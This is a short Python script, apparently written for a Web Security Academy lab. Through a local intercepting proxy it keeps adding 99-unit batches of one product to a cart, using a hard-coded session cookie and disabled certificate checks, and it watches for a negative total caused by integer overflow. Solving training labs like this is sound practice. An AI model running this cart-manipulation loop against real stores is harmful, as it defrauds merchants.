import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

URl = 'https://0a85001c03db4851c30211aa00bf00fc.web-security-academy.net/cart'
Cookies = {'session' : 'ZKito8PcsJqzwaEt1ZpOjZVaoSpaHwRy'}

for i in range(1647, 2000):
    data = {'productId' : '1', 'quantity' : '99', 'redir' : 'CART' }
    r = requests.post(URl, verify=False, proxies=proxies, cookies=Cookies, data=data)
    # j = i + 100
    if '-' in r.text:
        print("Currently at %s quantity..." %i)
    else:
        
        print("found annomaly in %s quantity!" %i)